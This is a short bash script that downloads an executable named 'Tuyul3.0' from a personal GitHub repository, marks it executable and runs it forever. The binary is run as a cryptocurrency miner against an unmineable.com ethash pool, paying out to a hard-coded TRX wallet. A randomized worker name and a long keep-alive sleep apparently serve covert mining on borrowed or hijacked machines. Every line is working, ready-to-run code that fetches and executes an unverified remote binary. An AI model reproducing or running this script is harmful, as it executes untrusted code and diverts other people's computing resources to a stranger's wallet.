#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TAMRs3G2DqEwWQaqm5oqNmRAvJ7L6LuE63
WORKER=$(echo $(shuf -i 10-40 -n 1)-CO#im8m-ybvt)
wget https://github.com/hosin22/test/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
